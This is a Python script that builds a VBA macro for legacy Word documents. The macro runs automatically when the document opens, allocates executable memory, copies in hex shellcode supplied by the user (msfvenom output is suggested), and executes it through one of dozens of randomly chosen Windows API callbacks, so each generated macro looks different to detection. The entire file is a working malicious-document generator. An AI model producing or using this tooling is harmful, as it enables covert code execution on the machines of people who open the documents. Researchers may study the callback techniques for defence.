#!/usr/bin/env python
import random, sys

__author__  = "Jeff White [karttoon]"
__email__   = "karttoon@gmail.com"
__version__ = "1.0.0"
__date__    = "17JAN2017"

# Dictionary structures
# key = Function name
# value = List of flags for supporting code to include, followed by respective declarations and VBA

# Memory allocation functions
memAlloc = {
    'VirtualAlloc':[['ZL'],
        'Private Declare Function allocateMemory Lib "kernel32" Alias "VirtualAlloc" (ByVal lpaddr As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\n',
        'memoryAddress = allocateMemory(zL, &H5000, &H1000, &H40)\n'],
    'NtAllocateVirtualMemory':[['ZL', 'RL'],
        'Private Declare Function allocateMemory Lib "ntdll" Alias "NtAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long\n',
        'memoryAddress = allocateMemory(ByVal -1, rL, zL, &H5000, &H1000, &H40)\n' +\
        'memoryAddress = rL\n'],
    'ZwAllocateVirtualMemory':[['ZL', 'RL'],
        'Private Declare Function allocateMemory Lib "ntdll" Alias "ZwAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long\n',
        'memoryAddress = allocateMemory(ByVal -1, rL, zL, &H5000, &H1000, &H40)\n' + \
        'memoryAddress = rL\n'],
    'HeapAlloc':[['ZL', 'RL'],
        'Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long\n' +\
        'Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long\n',
        'rL = createMemory(&H40000, zL, zL)\n' +\
        'memoryAddress = allocateMemory(rL, zL, &H5000)\n']
}

# Memory writing functions
memWrite = {
    'RtlMoveMemory':[[],
        'Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)\n',
        'copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1\n'],
    'WriteProcessMemory':[['ZL'],
        'Private Declare Function copyMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long\n',
        'copyMemory ByVal -1, memoryAddress, VarPtr(byteArray(0)), UBound(byteArray) + 1, zL\n']
}

# Shellcode execution functions
exeShell = {
    'CallWindowProcA':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Any, ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL, zL, zL)\n'],
    'CallWindowProcW':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "CallWindowProcW" (ByVal lpPrevWndFunc As Any, ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL, zL, zL)\n'],
    'DialogBoxIndirectParamA':[['WH', 'MH', 'OL'],
         'Private Declare Function shellExecute Lib "user32" Alias "DialogBoxIndirectParamA" (ByVal hInstance As Any, ByVal hDialogTemplate As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long\n',
         'executeResult = shellExecute(moduleHandle, moduleHandle, windowHandle, memoryAddress, oL)\n'],
    'DialogBoxIndirectParamW':[['WH', 'MH', 'OL'],
         'Private Declare Function shellExecute Lib "user32" Alias "DialogBoxIndirectParamW" (ByVal hInstance As Any, ByVal hDialogTemplate As Any, ByVal hWndParent As Any, ByVal lpDialogFunc As Any, ByVal dwInitParam As Any) As Long\n',
         'executeResult = shellExecute(moduleHandle, moduleHandle, windowHandle, memoryAddress, oL)\n'],
    'EnumCalendarInfoA':[['OL', 'RL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumCalendarInfoA" (ByVal pCalInfoEnumProc As Any, ByVal Locale As Any, ByVal Calendar As Any, ByVal CalType As Any) As Long\n',
         'rL = 3072\n' +\
         'executeResult = shellExecute(memoryAddress, rL, oL, oL)\n'],
    'EnumCalendarInfoW':[['OL', 'RL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumCalendarInfoW" (ByVal pCalInfoEnumProc As Any, ByVal Locale As Any, ByVal Calendar As Any, ByVal CalType As Any) As Long\n',
         'rL = 3072\n' +\
         'executeResult = shellExecute(memoryAddress, rL, oL, oL)\n'],
    'EnumDateFormatsA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumDateFormatsA" (ByVal lpDateFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumDateFormatsW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumDateFormatsW" (ByVal lpDateFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumDesktopWindows':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumDesktopWindows" (ByVal hDesktop As Any, ByVal lpfn As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL)\n'],
    'EnumDesktopsA':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumDesktopsA" (ByVal hwinsta As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL)\n'],
    'EnumDesktopsW':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumDesktopsW" (ByVal hwinsta As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL)\n'],
    'EnumLanguageGroupLocalesA':[['ZL', 'OL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesA" (ByVal lpLangGroupLocaleEnumProc As Any, ByVal LanguageGroup As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, oL, zL, zL)\n'],
    'EnumLanguageGroupLocalesW':[['ZL', 'OL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesW" (ByVal lpLangGroupLocaleEnumProc As Any, ByVal LanguageGroup As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, oL, zL, zL)\n'],
    'EnumPropsExA':[['WH'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumPropsExA" (ByVal hWnd As Any, ByVal lpEnumFunc As Any) As Long\n',
         'executeResult = shellExecute(windowHandle, memoryAddress)\n'],
    'EnumPropsExW':[['WH'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumPropsExW" (ByVal hWnd As Any, ByVal lpEnumFunc As Any) As Long\n',
         'executeResult = shellExecute(windowHandle, memoryAddress)\n'],
    'EnumPwrSchemes':[['ZL'],
         'Private Declare Function shellExecute Lib "powrprof" Alias "EnumPwrSchemes" (ByVal lpfnPwrSchemesEnumProc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumResourceTypesA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesA" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL)\n'],
    'EnumResourceTypesW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesW" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL)\n'],
    'EnumResourceTypesExA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesExA" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL, zL, zL)\n'],
    'EnumResourceTypesExW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumResourceTypesExW" (ByVal hModule As Any, ByVal lpEnumFunc As Any, ByVal lParam As Any, ByVal dwFlags As Any, ByVal LangId As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL, zL, zL)\n'],
    'EnumSystemCodePagesA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesA" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumSystemCodePagesW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumSystemLanguageGroupsA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsA" (ByVal lpLanguageGroupEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumSystemLanguageGroupsW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsW" (ByVal lpLanguageGroupEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumSystemLocalesA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal lpLocaleEnumProc As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumSystemLocalesW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemLocalesW" (ByVal lpLocaleEnumProc As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumThreadWindows':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumThreadWindows" (ByVal dwThreadId As Any, ByVal lpfn As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL)\n'],
    'EnumTimeFormatsA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumTimeFormatsA" (ByVal lpTimeFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumTimeFormatsW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumTimeFormatsW" (ByVal lpTimeFmtEnumProc As Any, ByVal Locale As Any, ByVal dwFlags As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumUILanguagesA':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumUILanguagesA" (ByVal lpUILanguageEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumUILanguagesW':[['ZL'],
         'Private Declare Function shellExecute Lib "kernel32" Alias "EnumUILanguagesW" (ByVal lpUILanguageEnumProc As Any, ByVal dwFlags As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL, zL)\n'],
    'EnumWindowStationsA':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumWindowStationsA" (ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumWindowStationsW':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumWindowStationsW" (ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumWindows':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "EnumWindows" (ByVal lpEnumFunc As Any, ByVal lParam As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, zL)\n'],
    'EnumerateLoadedModules':[['PH', 'ZL'],
         'Private Declare Function shellExecute Lib "dbghelp" Alias "EnumerateLoadedModules" (ByVal hProcess As Any, ByVal EnumLoadedModulesCallback As Any, ByVal UserContext As Any) As Long\n',
         'executeResult = shellExecute(processHandle, memoryAddress, zL)\n'],
    'EnumerateLoadedModulesEx':[['PH', 'ZL'],
         'Private Declare Function shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesEx" (ByVal hProcess As Any, ByVal EnumLoadedModulesCallback As Any, ByVal UserContext As Any) As Long\n',
         'executeResult = shellExecute(processHandle, memoryAddress, zL)\n'],
    'EnumerateLoadedModulesExW':[['PH', 'ZL'],
         'Private Declare Function shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesExW" (ByVal hProcess As Any, ByVal EnumLoadedModulesCallback As Any, ByVal UserContext As Any) As Long\n',
         'executeResult = shellExecute(processHandle, memoryAddress, zL)\n'],
    'GrayStringA':[['MH', 'OL'],
         'Private Declare Function shellExecute Lib "user32" Alias "GrayStringA" (ByVal hDC As Any, ByVal hBrush As Any, ByVal lpOutputFunc As Any, ByVal lpData As Any, ByVal nCount As Any, ByVal X As Any, ByVal Y As Any, ByVal nWidth As Any, ByVal nHeight As Any) As Long\n',
         'executeResult = shellExecute(moduleHandle, oL, memoryAddress, oL, oL, oL, oL, oL, oL)\n'],
    'GrayStringW':[['MH', 'OL'],
         'Private Declare Function shellExecute Lib "user32" Alias "GrayStringW" (ByVal hDC As Any, ByVal hBrush As Any, ByVal lpOutputFunc As Any, ByVal lpData As Any, ByVal nCount As Any, ByVal X As Any, ByVal Y As Any, ByVal nWidth As Any, ByVal nHeight As Any) As Long\n',
         'executeResult = shellExecute(moduleHandle, oL, memoryAddress, oL, oL, oL, oL, oL, oL)\n'],
    'NotifyIpInterfaceChange':[['ZL', 'OL'],
         'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyIpInterfaceChange" (ByVal Family As Any, ByVal Callback As Any, ByVal CallerContext As Any, ByVal InitialNotification As Any, ByVal NotificationHandle As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, oL, oL, oL)\n'],
    'NotifyTeredoPortChange':[['OL'],
         'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyTeredoPortChange" (ByVal Callback As Any, ByVal CallerContext As Any, ByVal InitialNotification As Any, ByVal NotificationHandle As Any) As Long\n',
         'executeResult = shellExecute(memoryAddress, oL, oL, oL)\n'],
    'NotifyUnicastIpAddressChange':[['ZL', 'OL'],
         'Private Declare Function shellExecute Lib "iphlpapi" Alias "NotifyUnicastIpAddressChange" (ByVal Family As Any, ByVal Callback As Any, ByVal CallerContext As Any, ByVal InitialNotification As Any, ByVal NotificationHandle As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, oL, oL, oL)\n'],
    'SHCreateThread':[['ZL'],
         'Private Declare Function shellExecute Lib "shlwapi" Alias "SHCreateThread" (ByVal pfnThreadProc As Any, ByVal pData As Any, ByVal dwFlags As Any, ByVal pfnCallback As Any) As Long\n',
         'executeResult = shellExecute(zL, zL, zL, memoryAddress)\n'],
    'SHCreateThreadWithHandle':[['PH', 'ZL'],
         'Private Declare Function shellExecute Lib "shlwapi" Alias "SHCreateThreadWithHandle" (ByVal pfnThreadProc As Any, ByVal pData As Any, ByVal flags As Any, ByVal pfnCallback As Any, ByVal pHandle As Any) As Long\n',
         'executeResult = shellExecute(zL, zL, zL, memoryAddress, processHandle)\n'],
    'SendMessageCallbackA':[['WH', 'ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "SendMessageCallbackA" (ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any, ByVal lpCallBack As Any, ByVal dwData As Any) As Long\n',
         'executeResult = shellExecute(windowHandle, zL, zL, zL, memoryAddress, zL)\n'],
    'SendMessageCallbackW':[['WH', 'ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "SendMessageCallbackW" (ByVal hWnd As Any, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any, ByVal lpCallBack As Any, ByVal dwData As Any) As Long\n',
         'executeResult = shellExecute(windowHandle, zL, zL, zL, memoryAddress, zL)\n'],
# Works except you need to trigger an event
#    'SetWinEventHook':[['MH', 'ZL', 'OL'],
#         'Private Declare Function shellExecute Lib "user32" Alias "SetWinEventHook" (ByVal eventMin As Any, ByVal eventMax As Any, ByVal hmodWinEventProc As Any, ByVal lpfnWinEventProc As Any, ByVal idProcess As Any, ByVal idThread As Any, ByVal dwflags As Any) As Long\n',
#         'executeResult = shellExecute(zL, oL, moduleHandle, memoryAddress, zL, zL, zL)\n'],
    'SetWindowsHookExA':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Any, ByVal lpfn As Any, ByVal hMod As Any, ByVal dwThreadId As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL, zL)\n'],
    'SetWindowsHookExW':[['ZL'],
         'Private Declare Function shellExecute Lib "user32" Alias "SetWindowsHookExW" (ByVal idHook As Any, ByVal lpfn As Any, ByVal hMod As Any, ByVal dwThreadId As Any) As Long\n',
         'executeResult = shellExecute(zL, memoryAddress, zL, zL)\n']
}

# Random select functions from each dictionary
allocFunc = memAlloc.keys()[random.randrange(0,len(memAlloc),1)]
writeFunc = memWrite.keys()[random.randrange(0,len(memWrite),1)]
shellFunc = exeShell.keys()[random.randrange(0,len(exeShell),1)]

# Determine flags for support code required by the functions
macFlag = []

for flagList in (memAlloc[allocFunc][0], memWrite[writeFunc][0], exeShell[shellFunc][0]):
    for flag in flagList:
        if flag not in macFlag:
            macFlag.append(flag)

macro = ''

macro += '''
################################################
#                                              #
#   Copy VBA to Microsoft Office 97-2003 DOC   #
#                                              #
#   Alloc: %-35s #
#   Write: %-35s #
#   ExeSC: %-35s #
#                                              #
################################################\n
''' % (allocFunc, writeFunc, shellFunc)

macro += memAlloc[allocFunc][1]
macro += memWrite[writeFunc][1]
macro += exeShell[shellFunc][1]
macro += '''
Private Sub Document_Open()

Dim shellCode As String
Dim shellLength As Byte
Dim byteArray() As Byte
Dim memoryAddress As Long
'''

# Supporting code for functions
if 'WH' in macFlag:
    macro += 'Dim windowHandle As Long\n' +\
             'windowHandle = getWindowHandle()\n'
if 'PH' in macFlag:
    macro += 'Dim ProcessHandle As Long\n' +\
             'ProcessHandle = getProcessHandle()\n'
if 'TH' in macFlag:
    macro += 'Dim threadHandle As Long\n' +\
             'threadHandle = getThreadHandle()\n'
if 'MH' in macFlag:
    macro += 'Dim moduleHandle As Long\n' +\
             'moduleHandle = getModuleHandle(vbNullString)\n'
if 'ZL' in macFlag:
    macro += 'Dim zL As Long\n' +\
             'zL = 0\n'
if 'OL' in macFlag:
    macro += 'Dim oL As Long\n' +\
             'oL = 1\n'
if 'RL' in macFlag:
    macro += 'Dim rL As Long\n'

# Filter msfvenom C/Py output to get a hex-string, 'FEEDADEADFEDBABE'
if len(sys.argv) == 2:
    sys.argv[1] = sys.argv[1].replace('unsigned char buf[]', '')
    sys.argv[1] = sys.argv[1].replace('\n', '')
    sys.argv[1] = sys.argv[1].replace('buf', '')
    sys.argv[1] = sys.argv[1].replace('+', '')
    sys.argv[1] = sys.argv[1].replace('=', '')
    sys.argv[1] = sys.argv[1].replace('\\x', '')
    sys.argv[1] = sys.argv[1].replace('"', '')
    sys.argv[1] = sys.argv[1].replace(';', '')
    sys.argv[1] = sys.argv[1].replace(' ', '')
    macro += '''
shellCode = "%s"
''' % sys.argv[1]
else:
    print '[!] ERROR: Supply hexadecimal shellcode as input (eg msfvenom -p windows/exec CMD=\'calc.exe\' -f c)'
    sys.exit(1)

macro += '''
shellLength = Len(shellCode) / 2
ReDim byteArray(0 To shellLength)

For i = 0 To shellLength - 1

    If i = 0 Then
        pos = i + 1
    Else
        pos = i * 2 + 1
    End If
    Value = Mid(shellCode, pos, 2)
    byteArray(i) = Val("&H" & Value)

Next\n
'''

macro += memAlloc[allocFunc][2] + '\n'
macro += memWrite[writeFunc][2] + '\n'
macro += exeShell[shellFunc][2] + '\n'

macro += "End Sub"

print macro